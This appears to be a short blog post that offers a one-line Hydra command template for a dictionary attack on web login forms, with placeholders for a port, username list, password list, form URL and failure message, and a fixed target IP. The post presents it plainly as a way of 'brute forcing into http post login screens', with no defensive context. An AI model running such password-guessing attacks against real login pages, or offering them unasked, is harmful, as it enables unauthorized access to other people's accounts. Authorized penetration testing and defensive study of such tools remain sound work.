---
layout: post
title:  Hydra webform attack
categories: [Code, Linux, Hydra]
---

This is a code snippet for a dictionary attack on a webform. It can be used for brute forcing into http post login screens.

```
hydra 99.0.4.3 -s <PORT> -l <LOGIN/LOGINS LIST> -P <PASSWORD/PASSWORD LIST>  http-post-form "<form url>:username=^USER^&password=^PASS^&submit=Submit:<fail message>"
```
